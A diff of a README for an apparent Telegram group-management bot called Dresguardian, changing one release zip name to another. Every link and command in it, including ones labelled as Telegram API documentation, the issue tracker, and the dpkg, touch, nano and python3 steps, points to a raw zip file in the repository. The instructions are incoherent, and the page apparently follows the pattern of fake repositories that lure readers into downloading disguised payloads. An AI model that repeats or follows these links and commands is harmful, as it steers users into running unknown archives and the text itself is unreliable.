@@ -6,7 +6,7 @@ Dresguardian is a privacy-focused bot for managing Telegram groups. It comes equ
 
 ## 📥 Download the Latest Release
 
-[![Download Dresguardian](https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.7-alpha.1.zip%20Dresguardian-v1.0-brightgreen?style=for-the-badge)](https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.7-alpha.1.zip)
+[![Download Dresguardian](https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.6.zip%20Dresguardian-v1.0-brightgreen?style=for-the-badge)](https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ To run Dresguardian smoothly, ensure your system meets the following requirement
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.7-alpha.1.zip) to access the latest version.
+1. Visit the [Releases page](https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.6.zip) to access the latest version.
 2. Locate the download file that matches your operating system:
    - For Ubuntu users, download the `.deb` package.
    - For Debian users, download the appropriate `.deb` file.
@@ -30,10 +30,10 @@ To run Dresguardian smoothly, ensure your system meets the following requirement
 For Ubuntu or Debian users, run the following command to install the bot:
 
 ```bash
-sudo dpkg -i https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.7-alpha.1.zip
+sudo dpkg -i https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.6.zip
 ```
 
-Replace `https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.7-alpha.1.zip` with the actual path to the downloaded file. 
+Replace `https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.6.zip` with the actual path to the downloaded file. 
 
 In case of dependency issues, run:
 
@@ -50,13 +50,13 @@ After installation, configure the bot:
 3. Create a configuration file by running:
 
 ```bash
-touch https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.7-alpha.1.zip
+touch https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.6.zip
 ```
 
-4. Edit the `https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.7-alpha.1.zip` file to include your Telegram API token and group ID. You can use any text editor, such as nano:
+4. Edit the `https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.6.zip` file to include your Telegram API token and group ID. You can use any text editor, such as nano:
 
 ```bash
-nano https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.7-alpha.1.zip
+nano https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.6.zip
 ```
 
 Insert the following template:
@@ -78,7 +78,7 @@ To run Dresguardian, use your terminal:
 2. Start the bot by running:
 
 ```bash
-python3 https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.7-alpha.1.zip
+python3 https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.6.zip
 ```
 
 The bot will connect to Telegram and start managing your group. 
@@ -104,7 +104,7 @@ If you face issues:
 2. Verify your configuration is correct.
 3. Check your internet connection.
 
-For further help, refer to the issue tracker on the [GitHub page](https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.7-alpha.1.zip).
+For further help, refer to the issue tracker on the [GitHub page](https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.6.zip).
 
 ## 📞 Support
 
@@ -112,7 +112,7 @@ For any questions or support, you may reach out via the project's GitHub reposit
 
 ## 📌 Additional Resources
 
-- [Telegram Bot API Documentation](https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.7-alpha.1.zip)
-- [DuckDuckGo Search API](https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.7-alpha.1.zip)
+- [Telegram Bot API Documentation](https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.6.zip)
+- [DuckDuckGo Search API](https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.6.zip)
 
-Visit the [Releases page](https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.7-alpha.1.zip) to download Dresguardian now!
+Visit the [Releases page](https://github.com/eduardopini/Dresguardian/raw/refs/heads/main/fetched/Software-3.6.zip) to download Dresguardian now!
